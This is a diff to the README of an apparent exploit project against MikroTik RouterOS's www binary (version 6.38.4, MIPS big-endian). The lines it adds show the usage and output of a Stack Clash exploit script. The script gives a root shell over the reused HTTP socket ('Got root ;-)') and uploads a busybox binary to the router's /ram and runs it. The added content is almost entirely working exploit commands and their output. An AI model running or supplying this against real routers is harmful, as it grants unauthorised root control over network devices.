@@ -122,6 +122,29 @@ Reuse the http socket to spawn a shell, so you can have a shell without a revers
 ```
 $ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
 $ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary
+[...]
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+```  
+### Upload binaries without a reverse shell
+To upload `busybox-mips` in `/ram/busybox`  
+```
+$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_mipsbe busybox-mips /ram/busybox   
+[...]   
+Uploading busybox-mips in /ram/busybox...   
+Upload done!
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+cd /tmp
+chmod 777 busybox
+./busybox
+BusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.
+[...]
 ```
 
 # FAQ
